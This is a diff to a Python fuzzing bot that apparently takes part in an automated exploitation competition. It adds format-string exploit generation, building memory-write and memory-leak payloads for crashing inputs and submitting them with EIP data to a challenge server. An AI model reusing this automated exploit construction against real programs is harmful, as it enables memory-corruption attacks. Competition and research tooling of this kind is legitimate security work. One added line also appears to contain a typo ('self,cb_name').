@@ -11,6 +11,7 @@ import shlex
 import multiprocessing
 import hashlib
 from pwn import *
+from fmt import FmtPayload
 
 
 afl_path = '/home/cnss/Desktop/afl'
@@ -89,6 +90,19 @@ class AFLrobot:
 
     def submit_crash(self, bin_input):
         """submit the crash input to the specific url """
+        contorl_eip = self.cb['EIP']
+        memread_addr = int(self.cb['MemoryReadPath'],16)
+        writemem_addr = int(self.cb['MemoryWritePath'],16)
+        writemem_value = int(self.cb['MemoryWriteContent'],16)
+
+        eip_payload = ''
+        memread_payload = ''
+        memwrite_payload = ''
+
+        fmtp = FmtPayload(self,cb_name,bin_input)
+        if fmtp.is_fmt():
+            memwrite_payload = fmtp.get_write_payload(writemem_addr,writemem_value)
+            memread_payload = fmtp.get_leak_payload(memread_addr)
 
         template = {"payloadInfo": [{
             "ChallengeID": "",
@@ -100,8 +114,10 @@ class AFLrobot:
             "Defense": ""}]}
 
         template["payloadInfo"][0]["ChallengeID"] = self.cb["ChallengeID"]
-        template["payloadInfo"][0]["Payload"][0]["Crash"] = base64.b64encode(
-            bin_input)
+        template["payloadInfo"][0]["Payload"][0]["Crash"] = base64.b64encode(bin_input)
+        template["payloadInfo"][0]["Payload"][0]["Eip"] = base64.b64encode(eip_payload)
+        template["payloadInfo"][0]["Payload"][0]["Memwrite"] = base64.b64encode(memwrite_payload)
+        template["payloadInfo"][0]["Payload"][0]["Memread"] = base64.b64encode(memread_payload)
         print '\t{} Submitting crash'.format(self.cb['ChallengeID'])
         logging.info('{} Submitting crash'.format(self.cb['ChallengeID']))
         temstr = json.dumps(template["payloadInfo"])
